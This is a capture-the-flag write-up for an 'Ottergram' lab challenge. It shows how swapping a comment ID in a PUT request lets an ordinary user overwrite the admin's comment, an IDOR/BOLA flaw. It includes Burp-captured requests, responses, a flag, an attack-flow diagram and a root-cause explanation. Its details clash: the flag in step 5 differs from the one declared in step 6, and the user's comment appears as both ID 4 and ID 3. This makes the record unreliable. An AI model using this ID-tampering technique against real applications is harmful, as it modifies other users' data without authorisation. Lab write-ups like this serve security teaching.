# Ottergram — ottergram-009 — Can You Edit Comments?

## 1. Create a comment

Log in to Ottergram and create a comment on Post 1.

Use:
```
test comment
```
Capture the request in Burp Suite → Proxy → HTTP history.

You should see:

`POST /api/posts/1/comments`

with:
```json
{
  "content": "test comment"
}
```
The response should provide your comment ID:
```json
{
  "id": 4,
  "message": "Comment added successfully"
}
```
Therefore:

Your comment ID = `4`
Your user ID = `4`
## 2. View the comments

Click the comments button and inspect:

`GET /api/posts/1/comments`

The response reveals the existing comments:
```json
[
  {
    "id": 1,
    "user_id": 2,
    "post_id": 1,
    "content": "So cute!",
    "username": "admin"
  },
  {
    "id": 2,
    "user_id": 3,
    "post_id": 1,
    "content": "I love otters too!",
    "username": "sea_otter_fan"
  },
  {
    "id": 4,
    "user_id": 4,
    "post_id": 1,
    "content": "test comment",
    "username": "fashil"
  }
]
```
This tells us:
```
Comment ID	Owner	        User ID
1	        admin	        2
2	        sea_otter_fan	3
4	        fashil	        4
```
## 3. Find the edit endpoint

The application's comment-edit functionality uses:

`PUT /api/posts/1/comments/{comment_id}`

For your own comment, the legitimate request is:

`PUT /api/posts/1/comments/4`

with:
```json
{
  "content": "We've changed the comment"
}
```
The server responds:
```json
{
  "message": "Comment updated successfully"
}
```
## 4. Test the authorization

Send the request to Burp Repeater.

Initially, the endpoint references your own comment:

`PUT /api/posts/1/comments/4`

Change only the comment ID:

`PUT /api/posts/1/comments/1`

Keep the same authenticated session/token.

Use:
```json
{
  "content": "We've changed the comment"
}
```
Send the request.

The server responds:
```json
{
  "message": "Comment updated successfully"
}
```
## 5. Verify the modification

Refresh Ottergram and click on the comments button again or resend the:

`GET /api/posts/1/comments`

The first comment, originally belonging to admin, now contains:

We've changed the comment

followed by the challenge flag.
```json
{ id: 1, user_id: 2, post_id: 1, … }
id	1
user_id	2
post_id	1
content	"We've changed the comment bug{RRezlXevNDQz8LIAmMUC1rdFaCTWqXXJ}"
created_at	"2026-09-21 08:21:14"
username	"admin"
profile_picture	"/uploads/otter2.png"
1	{ id: 2, user_id: 3, post_id: 1, … }
id	2
user_id	3
post_id	1
content	"I love otters too!"
created_at	"2026-09-21 08:21:14"
username	"sea_otter_fan"
profile_picture	"/uploads/otter3.png"
2	{ id: 3, user_id: 4, post_id: 1, … }
id	3
user_id	4
post_id	1
content	"Test Comment"
created_at	"2026-09-21 08:22:03"
username	"fashil"
profile_picture	null
```

## 6. Capture the flag

The resulting comment contains:

`bug{S94tZWnnxehAKalZUKcRWV3zE4A4MrOC}`

Flag
```
bug{S94tZWnnxehAKalZUKcRWV3zE4A4MrOC}
```
## Vulnerability

The vulnerability is Broken Object Level Authorization (BOLA), commonly also described as IDOR.

The application correctly authenticates you as:

`user_id = 4`

but does not verify that the comment specified in the URL belongs to user 4.

You were therefore able to change:

`/comments/1`

even though comment 1 belongs to:

`admin (user_id = 2)`

## Attack flow
```
Authenticated as fashil
        │
        ▼
PUT /api/posts/1/comments/4
        │
        ▼
Own comment → works
        │
        ▼
Change 4 → 1
        │
        ▼
PUT /api/posts/1/comments/1
        │
        ▼
Server fails to check ownership
        │
        ▼
Admin's comment modified
        │
        ▼
FLAG
```
## Root cause

The server should perform an authorization check similar to:

`Does comment.user_id == authenticated_user.id?`

If false, it should return something like:

`403 Forbidden`

Instead, it accepted the request and modified another user's comment.